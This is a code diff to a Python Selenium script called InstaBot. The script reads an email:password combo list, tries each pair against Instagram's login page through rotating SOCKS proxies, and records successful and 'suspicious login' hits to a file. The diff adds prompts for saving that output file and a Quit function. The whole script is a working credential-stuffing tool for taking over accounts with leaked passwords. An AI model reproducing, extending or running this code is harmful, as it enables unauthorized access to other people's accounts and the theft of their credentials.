@@ -52,13 +52,14 @@ class InstaBot:
                 "//input[@name=\"password\"]").send_keys(password)
 
             time.sleep(getRandomTime())
+            print("CTRL-C to Save File!")
 
             try:
                 try:
             	    driver.find_element_by_xpath("//a[@class='_6vuJt']").click()
             	    print("SUSPICIOUS LOGIN ATTEMPT:" +
             	          username + ":" + password + "\n")
-            	    w_file.write("SUS-LOGIN: "+username + ":" + password+ "\n")
+            	    w_file.write("SUS-LOGIN: "+username + ":" + password + "\n")
                 except Exception:
                     print("\nNo suspicious login attempt")
                 function_success(driver, username, password, w_file)
@@ -77,6 +78,7 @@ class InstaBot:
                 "//input[@name=\"password\"]").send_keys(password)
 
             time.sleep(getRandomTime())
+            print("CTRL-C to Save File!")
 
             try:
                 try:
@@ -102,6 +104,8 @@ def function_success(driver, username, password, w_file):
 def getRandomTime():
     randTime = randint(3, 5)
     return randTime
+def Quit():
+	w_file.close()
 
 
 r_file = input("What is the combo list in [Email:Pass] format?>")
@@ -118,6 +122,10 @@ for line in r_file:
             InstaBot(User, Password, i, socks_4f, socks_proxy, w_file)
         except Exception:
         	print("Page failed to load")
+        	x = input("Save File?[Y/N]")
+        	if x == 'Y':
+        		Quit()
+        		
         print("\nSOCKS: " + socks_proxy)
     if socks_4f == 'N':
         socks_proxy = str(socks)
@@ -125,9 +133,12 @@ for line in r_file:
             InstaBot(User, Password, i, socks_4f, socks_proxy, w_file)
         except:
         	print("Page failed to load")
+        	x = input("Save File?[Y/N]")
+        	if x == 'Y':
+        		Quit()
     if socks_4f != 'N':
         if i == len(socks) - 1:
             print("Recycling Socks")
             i -= len(socks)
     i += 1
-w_file.close()
+
